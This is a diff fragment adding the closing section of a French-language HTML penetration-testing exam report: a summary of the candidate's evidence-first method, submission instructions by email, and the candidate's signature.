+La méthodologie suivie — reconnaissance passive avant exploitation active, validation de chaque hypothèse par
+une preuve technique reproductible, documentation systématique des commandes et sorties obtenues — reflète
+une approche professionnelle de test d'intrusion « evidence-first », conforme aux attentes de l'évaluation.
+</p>
+<p>
+Ce rapport, accompagné des captures d'écran de la plateforme d'examen et des preuves techniques détaillées
+ci-dessus, est soumis pour revue conformément au règlement (soumission PDF à <code>reports@thundercipher.in</code>
+dans les 24 heures suivant la fin du lab).
+</p>
+
+<p style="margin-top:40px; text-align:right;"><b>Hodabalo Raphaël BOUE</b><br>Candidat — TC-VAPT Exam #1</p>
+</section>
+
+</body>
+</html>
